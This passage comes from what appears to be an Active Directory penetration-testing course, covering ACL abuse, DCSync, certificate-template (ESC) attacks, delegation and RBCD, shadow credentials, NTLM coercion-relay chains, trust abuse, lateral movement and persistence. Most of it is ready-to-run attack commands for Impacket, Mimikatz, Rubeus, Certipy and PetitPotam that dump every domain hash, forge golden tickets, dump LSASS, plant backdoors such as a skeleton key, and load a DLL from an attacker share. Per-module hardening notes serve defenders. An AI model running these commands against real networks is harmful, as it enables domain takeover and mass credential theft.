- Rotate `krbtgt` password regularly (twice, 24 hours apart, to invalidate Golden Tickets).
- Enable Kerberos preauthentication on ALL accounts.
- Monitor Event IDs: 4769 (TGS request — Kerberoasting), 4768 (TGT request — AS-REP), 4771 (preauth failure).

## Module 7: ACL Abuse & DCSync

*Exploit AD permissions and directory replication to extract all domain hashes.*

### Key ACL Rights

| Right | What It Allows |
|-------|---------------|
| **GenericAll** | Full control — read, write, delete, modify permissions |
| **GenericWrite** | Modify properties, create child objects |
| **WriteDacl** | Change the ACL itself — add or remove permissions |
| **WriteOwner** | Take ownership of the object |
| **ForceChangePassword** | Reset a user's password without knowing the current one |
| **DS-Replication-Get-Changes** | Pull password hashes via DCSync (replication) |
| **DS-Replication-Get-Changes-All** | Required alongside the above for full DCSync |

### 1. ACL Enumeration

**PowerView:**

```powershell
Import-Module .\PowerView.ps1

# ACLs on domain root (find DCSync rights)
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match "DS-Replication" } |
  Select IdentityReference, ObjectAceType

# ACLs on a specific user
Get-ObjectAcl -Identity "svc_admin" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|ForceChangePassword" } |
  Select IdentityReference, ActiveDirectoryRights
```

**BloodHound** — best for discovering ACL attack paths at scale. Run SharpHound with ACL collection:

```
SharpHound.exe --CollectionMethods ACL,Group,Session,LocalAdmin
```

### 2. ACL Abuse Scenarios

**GenericAll on a user → reset password:**

```powershell
Set-ADAccountPassword -Identity "AdminUser" -NewPassword (ConvertTo-SecureString "NewP@ss!" -AsPlainText -Force)
```

**GenericAll on a user → targeted Kerberoast (set SPN):**

```powershell
Set-ADUser -Identity "AdminUser" -ServicePrincipalNames @{Add="fake/spn"}
# Now Kerberoast the account
Rubeus.exe kerberoast /user:AdminUser
# Clean up
Set-ADUser -Identity "AdminUser" -ServicePrincipalNames @{Remove="fake/spn"}
```

**GenericAll on a user → Shadow Credentials (see Module 10):**

```
Whisker.exe add /target:AdminUser
# Use output Rubeus command to get TGT
```

**GenericAll on a group → add yourself:**

```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "attacker_user"
```

**WriteDacl on domain root → grant DCSync rights:**

```powershell
$acl = Get-Acl "AD:\DC=corp,DC=local"
$sid = New-Object System.Security.Principal.NTAccount("CORP\attacker_user")
# DS-Replication-Get-Changes
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
# DS-Replication-Get-Changes-All
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl "AD:\DC=corp,DC=local" $acl
```

**ForceChangePassword:**

```
# Impacket
impacket-changepasswd corp.local/attacker:'Pass123'@dc1.corp.local -newpass 'Hacked!' -target admin_user -reset
```

### 3. DCSync Attack

Abuse replication rights to pull ALL domain hashes without touching the DC filesystem.

**Prerequisite:** Account with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (Domain Admins have this by default).

**Impacket (Linux):**

```
# Dump all hashes
impacket-secretsdump -just-dc corp.local/administrator:'P@ss!'@dc1.corp.local

# Dump specific user (krbtgt for Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt corp.local/administrator:'P@ss!'@dc1.corp.local
```

**NetExec (dumps full NTDS.dit via VSS shadow copy):**

```
nxc smb dc1.corp.local -u administrator -p 'P@ss!' --ntds
```

**Mimikatz (Windows):**

```
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
```

Example output:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404ee:1122334455aabbcc...
krbtgt:502:aad3b435b51404ee:5566778899ddeeff...
svc_sql:1107:aad3b435b51404ee:aabbccdd11223344...
```

### 4. AdminSDHolder Persistence

AdminSDHolder ACL is copied to all protected groups every 60 minutes (by SDProp). If you add an ACE to AdminSDHolder, it persists across all protected objects.

```powershell
# Add GenericAll for attacker to AdminSDHolder
$sdh = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$acl = Get-Acl $sdh
$sid = New-Object System.Security.Principal.NTAccount("CORP\attacker_user")
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "GenericAll", "Allow")
$acl.AddAccessRule($rule)
Set-Acl $sdh $acl
```

After 60 minutes, `attacker_user` has GenericAll on all protected accounts (Domain Admins, Enterprise Admins, etc.).

### Hardening

- Remove `DS-Replication-Get-Changes` from all non-DC principals.
- Monitor Event ID 4662 for replication GUID access by non-DC accounts.
- Audit ACLs on domain root, AdminSDHolder, and high-value OUs regularly.
- Use BloodHound to detect shadow admin paths.
- Monitor AdminSDHolder changes via Event ID 5136.

## Module 8: AD Certificate Services (ESC1-ESC16)

*Exploit misconfigured certificate templates for privilege escalation. AD CS is one of the most common and impactful AD attack vectors.*

### Key Concepts

**AD CS (Active Directory Certificate Services)** — Microsoft's PKI solution. Issues X.509 certificates for authentication, encryption, and signing.

**Certificate Template** — Defines what a certificate can do, who can request it, and how the subject name is determined.

**PKINIT** — Kerberos extension allowing certificate-based authentication instead of passwords. This is how AD CS abuse translates into domain compromise.

**Certipy** — The primary tool for AD CS enumeration and exploitation (Python, supports ESC1-ESC16).

**Certify** — C# alternative to Certipy. Certify 2.0 released August 2025 with enhanced capabilities.

### 1. Enumeration

**Certipy (Linux — recommended):**

```
# Find all vulnerable templates
certipy find -u user1@corp.local -p 'Pass123' -dc-ip 10.0.0.1 -vulnerable -stdout

# Full enumeration (saves JSON + text output)
certipy find -u user1@corp.local -p 'Pass123' -dc-ip 10.0.0.1
```

**Certify (Windows):**

```
Certify.exe find /vulnerable
```

**LDAP manual enumeration:**

```
# Find CA servers
ldapsearch -x -H ldap://DC01.corp.local \
  -b "CN=Configuration,DC=corp,DC=local" \
  "(objectCategory=pKIEnrollmentService)" cn dNSHostName

# Find templates
ldapsearch -x -H ldap://DC01.corp.local \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage
```

### 2. Most Common ESC Attacks

**ESC1 — Enrollee Supplies Subject + Client Auth + Low-Priv Enrollment**

The classic AD CS misconfiguration. Template allows you to specify ANY user in the Subject Alternative Name (SAN) field.

Requirements: Template has `ENROLLEE_SUPPLIES_SUBJECT` flag + Client Authentication EKU + Domain Users can enroll + no manager approval.

```
# Request cert as Administrator
certipy req -u user1@corp.local -p 'Pass123' -dc-ip 10.0.0.1 \
  -target ca.corp.local -ca 'CORP-CA' -template 'VulnTemplate' \
  -upn 'administrator@corp.local'

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# Output: NT hash for administrator
```

**ESC4 — Template ACL Misconfiguration**

Low-priv user has `WriteDacl` or `GenericWrite` on a template → modify the template to make it vulnerable to ESC1, then exploit ESC1.

```
# Make template vulnerable
certipy template -u user1@corp.local -p 'Pass123' -template 'ESC4Template' -save-old

# Now exploit as ESC1
certipy req -u user1@corp.local -p 'Pass123' -target ca.corp.local \
  -ca 'CORP-CA' -template 'ESC4Template' -upn 'administrator@corp.local'

# Restore original template config
certipy template -u user1@corp.local -p 'Pass123' -template 'ESC4Template' -configuration ESC4Template.json
```

**ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA**

CA-level flag that allows SAN in ANY certificate request, regardless of template settings. Makes every template with Client Auth EKU vulnerable.

```
certipy req -u user1@corp.local -p 'Pass123' -target ca.corp.local \
  -ca 'CORP-CA' -template 'User' -upn 'administrator@corp.local'
```

**ESC8 — NTLM Relay to AD CS Web Enrollment (HTTP)**

The AD CS web enrollment endpoint accepts NTLM authentication over HTTP without EPA. Coerce a DC to authenticate to your relay → get a certificate as the DC.

```
# Terminal 1: Relay to AD CS
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController

# Terminal 2: Coerce DC
python3 PetitPotam.py attacker_ip dc1.corp.local

# Terminal 1 output: Base64 certificate for DC01$
# Save cert and authenticate:
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
```

**ESC11 — NTLM Relay to AD CS RPC Enrollment**

Same concept as ESC8 but targets the RPC enrollment interface instead of HTTP. Exploitable when `IF_ENFORCEENCRYPTICERTREQUEST` is disabled.

```
# Relay to RPC enrollment
certipy relay -ca ca.corp.local -template DomainController

# Coerce from another terminal
python3 PetitPotam.py attacker_ip dc1.corp.local
```

**ESC13 — Issuance Policy OID Group Link**

Template has an issuance policy linked to a high-privilege AD group via OID group link. Enrollment grants effective membership in that group.

### 3. ESC Summary Table

| ESC | Attack Surface | Impact |
|-----|---------------|--------|
| ESC1 | Template: Enrollee supplies subject + Client Auth | Impersonate any user |
| ESC2 | Template: Any Purpose or SubCA EKU | Impersonate any user |
| ESC3 | Template: Certificate Request Agent EKU | Enroll on behalf of others |
| ESC4 | Template: Low-priv user has Write on template | Modify template → ESC1 |
| ESC5 | PKI objects: Low-priv control over CA objects | Various escalation |
| ESC6 | CA: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled | SAN in any request |
| ESC7 | CA: Low-priv has ManageCA or ManageCertificates | Approve/issue arbitrary certs |
| ESC8 | CA: HTTP enrollment without EPA | NTLM relay → cert |
| ESC9 | Template: No security extension + StrongMapping off | Impersonation via SAN |
| ESC10 | Registry: StrongCertificateBindingEnforcement = 0 | UPN spoofing |
| ESC11 | CA: RPC enrollment without encryption | NTLM relay → cert (RPC) |
| ESC13 | Template: Issuance policy OID group link | Effective group membership |
| ESC14 | Template: Weak explicit mappings | Authentication as mapped user |
| ESC15 | Template: Application Policy in schema v1 | Similar to ESC13 |
| ESC16 | CA: Missing security extension (CA-wide) | Like ESC9 but global |

### Hardening

- Disable `ENROLLEE_SUPPLIES_SUBJECT` unless explicitly needed.
- Restrict enrollment to specific security groups (never Domain Users).
- Require manager approval on sensitive templates.
- Enable EPA on AD CS IIS endpoints.
- Enable `IF_ENFORCEENCRYPTICERTREQUEST` on RPC.
- Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` from CA.
- Audit certificate issuance logs (Event ID 4887).
- Use Certipy `find -vulnerable` regularly to audit.

## Module 9: Delegation Attacks & RBCD

*Abuse Kerberos delegation to impersonate users across services.*

### Key Concepts

**Unconstrained Delegation** — A machine trusted to delegate ANY user's TGT to ANY service. If you compromise this machine, you get every TGT that authenticates to it (including DAs). Identified by `TRUSTED_FOR_DELEGATION` flag (UAC bit 524288).

**Constrained Delegation** — A machine or service can only delegate to specific SPNs listed in `msDS-AllowedToDelegateTo`. Uses S4U2Self + S4U2Proxy protocol extensions.

**Resource-Based Constrained Delegation (RBCD)** — The target service controls who can delegate TO it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. Unlike constrained delegation, this can be configured by any account with write access to the target computer object.

**S4U2Self** — Service requests a TGS for a user to itself (without the user's credentials).

**S4U2Proxy** — Service uses S4U2Self ticket + its own TGT to request a TGS to a downstream service on behalf of the user.

### 1. Find Delegation

**Unconstrained delegation hosts:**

```
# LDAP
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  sAMAccountName

# PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

**Constrained delegation hosts:**

```
# LDAP
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" \
  sAMAccountName msDS-AllowedToDelegateTo

# PowerShell
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
```

**RBCD configured hosts:**

```
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like "*"} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

### 2. Unconstrained Delegation Exploitation

If you have local admin on an unconstrained delegation host, dump cached TGTs:

```
# Mimikatz — extract all cached tickets
privilege::debug
sekurlsa::tickets /export

# Rubeus — monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /nowrap
```

**Printer Bug + Unconstrained Delegation** — Force the DC to authenticate to the unconstrained host:

```
# From any domain user, trigger PrinterBug targeting the DC
SpoolSample.exe DC01.corp.local UNCONSTRAINED-HOST.corp.local

# On the unconstrained host, Rubeus captures DC01$'s TGT
Rubeus.exe monitor /interval:5 /targetuser:DC01$ /nowrap

# Use captured TGT for DCSync
Rubeus.exe ptt /ticket:<base64_tgt>
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"
```

### 3. Constrained Delegation Exploitation

If you compromise an account with constrained delegation, use S4U to impersonate any user to the allowed services.

**Rubeus (Windows):**

```
# If you have the account's hash
Rubeus.exe s4u /user:svc_web$ /rc4:<hash> /impersonateuser:Administrator \
  /msdsspn:CIFS/dc1.corp.local /ptt

# If you have the account's AES key
Rubeus.exe s4u /user:svc_web$ /aes256:<key> /impersonateuser:Administrator \
  /msdsspn:HTTP/dc1.corp.local /altservice:CIFS /ptt
```

**Impacket (Linux):**

```
impacket-getST -spn CIFS/dc1.corp.local -impersonate Administrator \
  -dc-ip 10.0.0.1 corp.local/svc_web$:'password'
export KRB5CCNAME=Administrator@CIFS_dc1.corp.local@CORP.LOCAL.ccache
impacket-smbclient -k -no-pass dc1.corp.local
```

Note: The `/altservice` flag in Rubeus allows you to modify the SPN in the ticket — e.g., change HTTP to CIFS — because the service name in the ticket is not encrypted.

### 4. RBCD (Resource-Based Constrained Delegation)

RBCD is one of the most versatile AD attacks. You need:
1. Write access to a computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity`.
2. An account with an SPN (either an existing machine account or one you create).

**Step 1: Create a machine account (if MachineAccountQuota > 0):**

```
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123' \
  -dc-ip 10.0.0.1 corp.local/user1:'Pass123'
```

Check MachineAccountQuota first:

```
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(objectClass=domain)" ms-DS-MachineAccountQuota
```

Default is 10 — any domain user can create up to 10 machine accounts.

**Step 2: Set RBCD on the target computer:**

```
# Impacket
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET-SRV$' -action write \
  -dc-ip 10.0.0.1 corp.local/user1:'Pass123'

# PowerShell
Set-ADComputer -Identity "TARGET-SRV" -PrincipalsAllowedToDelegateToAccount FAKE01$
```

**Step 3: S4U to impersonate Administrator on target:**

```
impacket-getST -spn CIFS/target-srv.corp.local -impersonate Administrator \
  -dc-ip 10.0.0.1 corp.local/'FAKE01$':'FakePass123'

export KRB5CCNAME=Administrator@CIFS_target-srv.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass target-srv.corp.local
```

**Common RBCD scenarios:**
- GenericWrite on a computer object → set RBCD → impersonate admin on that computer.
- Relay NTLM auth to LDAP → write RBCD on the relayed computer → impersonate admin.
- Combine with NTLM coercion for remote exploitation without initial access.

### Hardening

- Remove unconstrained delegation from all non-DC machines (DCs are unconstrained by default and cannot be changed).
- Set `MachineAccountQuota` to 0.
- Use Protected Users group (prevents delegation for members).
- Monitor Event IDs: 4768/4769 with delegation flags.
- Audit `msDS-AllowedToActOnBehalfOfOtherIdentity` changes.

## Module 10: Shadow Credentials & Coercion Chains

*Abuse msDS-KeyCredentialLink for account takeover, and chain coercion with relay for remote domain compromise.*

### Shadow Credentials

**What it is:** AD supports Windows Hello for Business (WHfB) key-based authentication. The public key is stored in `msDS-KeyCredentialLink`. If you can write to this attribute on a target, you can add your own key pair and authenticate as that account via PKINIT — without knowing or changing their password.

**Why it matters:** Less disruptive than password reset. Works on both user and computer objects. Persists until the key is removed.

**Prerequisites:** Domain Functional Level 2016+, at least one DC running Server 2016+, AD CS or equivalent PKI.

### 1. Shadow Credentials Attack

**Whisker (Windows):**

```
# Add shadow credential to target
Whisker.exe add /target:svc_admin /domain:corp.local /dc:dc1.corp.local

# Whisker outputs a Rubeus command — run it to get TGT + NT hash
Rubeus.exe asktgt /user:svc_admin /certificate:<base64_cert> /password:<password> /domain:corp.local /dc:dc1.corp.local /getcredentials /show /nowrap
```

**pyWhisker (Linux):**

```
# Add shadow credential
python3 pywhisker.py -d corp.local -u user1 -p 'Pass123' --target svc_admin --action add --filename svc_admin_cert

# Get TGT using PKINITtools
python3 gettgtpkinit.py -cert-pfx svc_admin_cert.pfx -pfx-pass <password> corp.local/svc_admin svc_admin.ccache

# Extract NT hash from TGT
export KRB5CCNAME=svc_admin.ccache
python3 getnthash.py -key <AS-REP_key> corp.local/svc_admin
```

**Cleanup (important):**

```
# List existing credentials
Whisker.exe list /target:svc_admin
python3 pywhisker.py -d corp.local -u user1 -p 'Pass123' --target svc_admin --action list

# Remove by DeviceID
Whisker.exe remove /target:svc_admin /deviceid:<GUID>
python3 pywhisker.py -d corp.local -u user1 -p 'Pass123' --target svc_admin --action remove --device-id <GUID>
```

### 2. Shadow Credentials via NTLM Relay

Computer objects can write their own `msDS-KeyCredentialLink`. So if you relay a machine's NTLM auth to LDAP, you can add shadow credentials for that machine.

```
# Terminal 1: Relay to LDAP with shadow credentials
impacket-ntlmrelayx -t ldap://dc1.corp.local --shadow-credentials --shadow-target 'DC01$'

# Terminal 2: Coerce DC to authenticate
python3 PetitPotam.py attacker_ip dc1.corp.local

# Terminal 1 output: PFX file for DC01$
# Authenticate
certipy auth -pfx DC01.pfx -dc-ip 10.0.0.1
# Now you have DC01$'s NT hash → DCSync
impacket-secretsdump -just-dc -hashes :dc01_hash corp.local/'DC01$'@dc1.corp.local
```

### 3. Full Coercion + Relay Attack Chains

These chains combine coercion (force authentication) with relay (forward auth) for domain compromise from a low-priv user with network access.

**Chain A: Coerce + Relay to LDAP + RBCD**

```
# 1. Start relay targeting LDAP, configure RBCD
impacket-ntlmrelayx -t ldap://dc2.corp.local --delegate-access --escalate-user attacker_user

# 2. Coerce DC01 to authenticate to us
python3 PetitPotam.py attacker_ip dc1.corp.local

# 3. Relay creates machine account + sets RBCD on DC01$
# 4. S4U impersonation
impacket-getST -spn CIFS/dc1.corp.local -impersonate Administrator corp.local/'RELAY_MACHINE$':'password'
```

**Chain B: Coerce + Relay to AD CS (ESC8)**

```
# 1. Start relay to AD CS web enrollment
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController

# 2. Coerce DC
python3 PetitPotam.py attacker_ip dc1.corp.local

# 3. Get certificate → authenticate → DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
impacket-secretsdump -just-dc -hashes :dc01_hash corp.local/'DC01$'@dc1.corp.local
```

**Chain C: Coerce + Relay to LDAP + Shadow Credentials**

```
# 1. Start relay with shadow credentials
impacket-ntlmrelayx -t ldap://dc2.corp.local --shadow-credentials --shadow-target 'DC01$'

# 2. Coerce DC01
python3 PetitPotam.py attacker_ip dc1.corp.local

# 3. Use PFX to get hash → DCSync
```

### Requirements Summary

| Chain | Requires | Targets |
|-------|----------|---------|
| Coerce + RBCD | LDAP signing disabled, MAQ > 0 | Any computer |
| Coerce + ESC8 | AD CS web enrollment over HTTP | DC or any machine |
| Coerce + Shadow Creds | LDAP signing disabled, DFL 2016+ | Any computer/user |

### Hardening

- Enforce LDAP signing and channel binding on all DCs.
- Enable EPA on AD CS web enrollment (or remove it entirely).
- Set `MachineAccountQuota` to 0.
- Monitor `msDS-KeyCredentialLink` attribute changes.
- Disable Print Spooler on DCs.
- Apply patches for PetitPotam and other coercion CVEs.

## Module 11: Domain Trust & Forest Attacks

*Pivot across trust boundaries to compromise additional domains and forests.*

### Key Concepts

**Domain Trust** — A link allowing users in one domain to access resources in another. Can be one-way or two-way.

**Trust Direction:**
- **Outbound (trusting):** "I trust THEM" — users from the trusted domain can access my resources.
- **Inbound (trusted):** "THEY trust ME" — my users can access their resources.
- **Bidirectional:** Both directions.

**Forest Trust** — Trust between separate AD forests. Cross-forest authentication.

**SID Filtering** — Protection that strips foreign SIDs from tokens at trust boundaries. Prevents Golden Ticket attacks across forests. Enabled by default on external trusts; disabled within the same forest.

**SID History** — Attribute preserving old SIDs after domain migration. If SID filtering is disabled, SID history can be abused to inject high-privilege SIDs.

### 1. Enumerate Trusts

```powershell
# PowerShell
Get-ADTrust -Filter * | Select Name, TrustType, Direction, ForestTransitive, SIDFilteringQuarantined

# nltest
nltest /domain_trusts /all_trusts

# LDAP
ldapsearch -x -H ldap://DC01.corp.local -b "CN=System,DC=corp,DC=local" \
  "(objectClass=trustedDomain)" cn trustDirection trustType securityIdentifier
```

Trust direction values: 1 = Inbound, 2 = Outbound, 3 = Bidirectional.

### 2. Child → Parent Domain Escalation

Within the same forest, SID filtering is NOT enforced between parent and child domains. This means you can forge a Golden Ticket with the Enterprise Admins SID from a child domain.

**Prerequisite:** `krbtgt` hash of the child domain.

```
# Get Enterprise Admins SID (from parent domain)
# Format: <ForestRootDomainSID>-519

# Forge Golden Ticket with EA SID in ExtraSids
impacket-ticketer -nthash <child_krbtgt_hash> -domain child.corp.local \
  -domain-sid S-1-5-21-CHILD... -extra-sid S-1-5-21-PARENT...-519 Administrator

# Or via Mimikatz
kerberos::golden /user:Administrator /domain:child.corp.local \
  /sid:S-1-5-21-CHILD... /sids:S-1-5-21-PARENT...-519 \
  /krbtgt:<child_krbtgt_hash> /ptt
```

Now you have Enterprise Admin rights across the entire forest.

**Using trust keys (inter-realm TGT):**

```
# Dump trust key
mimikatz.exe "lsadump::dcsync /domain:child.corp.local /user:child$"

# Forge inter-realm TGT
kerberos::golden /user:Administrator /domain:child.corp.local \
  /sid:S-1-5-21-CHILD... /sids:S-1-5-21-PARENT...-519 \
  /rc4:<trust_key> /service:krbtgt /target:corp.local /ptt
```

### 3. Cross-Forest Trust Abuse

Cross-forest trusts have SID filtering enabled by default, so you cannot inject arbitrary SIDs. However:

**Access shared resources:** If the external forest has granted access to your domain users, use those access rights.

```
# Enumerate resources accessible across the trust
Get-DomainObject -Domain partner.local -LDAPFilter "(objectCategory=group)" -Properties cn, member |
  Where-Object { $_.member -match "corp.local" }
```

**Kerberoast across trust boundaries:**

```
impacket-GetUserSPNs -target-domain partner.local -dc-ip partner_dc_ip corp.local/user1:'Pass123'
```

**If SID filtering is disabled (misconfiguration):**

```
# Forge ticket with partner domain's DA SID
impacket-ticketer -nthash <trust_key> -domain corp.local \
  -domain-sid S-1-5-21-CORP... -extra-sid S-1-5-21-PARTNER...-512 \
  -spn krbtgt/partner.local Administrator
```

### Hardening

- Enable SID filtering on ALL external trusts (default, but verify).
- Use selective authentication on trusts.
- Audit cross-forest access permissions.
- Monitor Event ID 4769 for cross-domain TGS requests.
- Minimize inter-forest trust relationships.

## Module 12: Lateral Movement & Privilege Escalation

*Pivot across hosts using credential material and remote execution tools.*

### 1. Pass-the-Hash (PtH)

Authenticate using NTLM hash without the plaintext password.

```
# Impacket
impacket-psexec -hashes :aad3b435b51404ee:1122334455aabbcc corp.local/administrator@10.0.0.20
impacket-wmiexec -hashes :1122334455aabbcc corp.local/administrator@10.0.0.20
impacket-smbexec -hashes :1122334455aabbcc corp.local/administrator@10.0.0.20

# NetExec (verify access first)
nxc smb 10.0.0.20 -u administrator -H 1122334455aabbcc

# Mimikatz
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:1122334455aabbcc /run:powershell.exe

# evil-winrm
evil-winrm -i 10.0.0.20 -u administrator -H 1122334455aabbcc
```

### 2. Pass-the-Ticket (PtT)

Inject Kerberos tickets into your session.

```
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Linux
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc1.corp.local
```

### 3. Over-Pass-the-Hash

Use NTLM hash to request a Kerberos TGT, then use Kerberos authentication (avoids NTLM-based detections).

```
# Rubeus
Rubeus.exe asktgt /user:administrator /rc4:1122334455aabbcc /domain:corp.local /ptt

# Impacket
impacket-getTGT -hashes :1122334455aabbcc corp.local/administrator
export KRB5CCNAME=administrator.ccache
```

### 4. Remote Execution Methods

| Method | Port | Requires | Noise Level |
|--------|------|----------|-------------|
| PSExec | 445 | Admin share + service creation | High |
| WMIExec | 135 | WMI access | Medium |
| SMBExec | 445 | Admin share | Medium |
| WinRM | 5985/5986 | Remote Management enabled | Low |
| DCOM | 135 | DCOM enabled | Low |
| AtExec | 445 | Task Scheduler | Medium |

```
# WinRM (PowerShell Remoting)
Enter-PSSession -ComputerName SRV01.corp.local -Credential corp\administrator

# evil-winrm (from Linux)
evil-winrm -i SRV01.corp.local -u administrator -p 'P@ssw0rd!'

# DCOM
impacket-dcomexec corp.local/administrator:'P@ssw0rd!'@10.0.0.20

# AtExec (scheduled task)
impacket-atexec corp.local/administrator:'P@ssw0rd!'@10.0.0.20 "whoami"
```

### 5. Credential Extraction on Compromised Hosts

```
# Mimikatz — dump logon passwords
privilege::debug
sekurlsa::logonpasswords

# Mimikatz — dump cached domain creds
lsadump::cache

# LSASS dump (from remote via NetExec)
nxc smb 10.0.0.20 -u admin -p 'P@ss!' --lsa
nxc smb 10.0.0.20 -u admin -p 'P@ss!' -M nanodump
nxc smb 10.0.0.20 -u admin -p 'P@ss!' -M lsassy

# SAM dump
nxc smb 10.0.0.20 -u admin -p 'P@ss!' --sam

# DPAPI secrets
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*"
```

### 6. Local Privilege Escalation

**PrintSpoofer / GodPotato / JuicyPotatoNG** — Escalate from service account to SYSTEM:

```
# PrintSpoofer (SeImpersonatePrivilege required)
PrintSpoofer.exe -i -c "cmd /c whoami"

# GodPotato (works on Server 2022+)
GodPotato.exe -cmd "cmd /c whoami"
```

**Token impersonation with Incognito:**

```
# Mimikatz
token::elevate
token::list
token::impersonate /user:corp\administrator
```

### Hardening

- Disable local admin password reuse across machines.
- Deploy LAPS for unique local admin passwords.
- Enable Credential Guard (prevents Mimikatz from reading LSASS).
- Add privileged accounts to Protected Users group.
- Disable WDigest authentication.
- Monitor for lateral movement: Event IDs 4624 (logon type 3/10), 4648 (explicit creds).

## Module 13: Persistence & Cleanup

*Maintain access and cover tracks after achieving DA.*

### 1. Golden Ticket Persistence

Already covered in Module 6. Key point: lasts until `krbtgt` password is rotated twice.

### 2. Silver Ticket Persistence

Forge TGS for specific services. Lasts until the service account password changes.

### 3. AdminSDHolder Backdoor

Already covered in Module 7. SDProp runs every 60 minutes and propagates your ACE to all protected groups.

### 4. GPO Backdoor

Create or modify a GPO to execute a payload on domain-joined machines.

```powershell
# Create scheduled task via GPO (PowerShell)
New-GPO -Name "Maintenance" | New-GPLink -Target "OU=Servers,DC=corp,DC=local"

# Add logon script
Set-GPRegistryValue -Name "Maintenance" \
  -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0" \
  -ValueName "Script" -Type String -Value "\\dc1\sysvol\corp.local\scripts\update.ps1"
```

### 5. Certificate-Based Persistence

Certificates persist through password changes. If you obtained a cert via ESC1 or other AD CS abuse, it remains valid until expiration.

```
# Request a long-lived certificate
certipy req -u administrator@corp.local -p 'P@ss!' -target ca.corp.local \
  -ca 'CORP-CA' -template User

# Authenticate anytime (even after password change)
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### 6. Shadow Credentials Persistence

Add a key credential to a privileged account — persists through password changes.

```
Whisker.exe add /target:administrator /domain:corp.local
```

### 7. SID History Injection

If you have DCSync/replication rights, inject Enterprise Admin SID into a normal user's SID history.

```
# Mimikatz
sid::add /sam:backdoor_user /new:S-1-5-21-...-519
```

### 8. Skeleton Key

Patch LSASS on the DC to accept a master password for any account. Does not survive DC reboot.

```
mimikatz.exe "misc::skeleton"
# Now "mimikatz" works as password for any account
```

### 9. Cleanup Checklist

After the engagement, clean up all persistence:

- Remove added AD group memberships.
- Remove ACEs added to AdminSDHolder or domain root.
- Remove shadow credentials (Whisker remove).
- Delete created machine accounts.
- Remove RBCD configurations.
- Revert modified GPOs.
- Revoke any issued certificates.
- Remove created user accounts.
- Clear Kerberos ticket caches.
- Document everything cleaned up in the report.

## Module 14: Miscellaneous Misconfigurations

*Additional common findings and modern attack vectors.*

### 1. MachineAccountQuota Abuse

Default: any domain user can create up to 10 machine accounts. This enables RBCD attacks (Module 9).

```
# Check quota
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(objectClass=domain)" ms-DS-MachineAccountQuota
```

**Fix:** Set `ms-DS-MachineAccountQuota` to 0.

### 2. Stale Computer Accounts

Machines not logged in for 90+ days may have weak/unchanged passwords.

```powershell
$threshold = (Get-Date).AddDays(-90)
Get-ADComputer -Filter {LastLogonTimestamp -lt $threshold} -Properties LastLogonTimestamp, OperatingSystem |
  Select Name, OperatingSystem, @{N='LastLogon';E={[DateTime]::FromFileTime($_.LastLogonTimestamp)}}
```

### 3. DnsAdmins Privilege Escalation

Members of the DnsAdmins group can load arbitrary DLLs into the DNS service (runs as SYSTEM on the DC).

```
# Set malicious DLL
dnscmd dc1.corp.local /config /serverlevelplugindll \\attacker\share\evil.dll

# Restart DNS service
sc \\dc1.corp.local stop dns
sc \\dc1.corp.local start dns
```

### 4. Backup Operators Abuse

Members can back up files including the AD database.

```
# Backup NTDS.dit
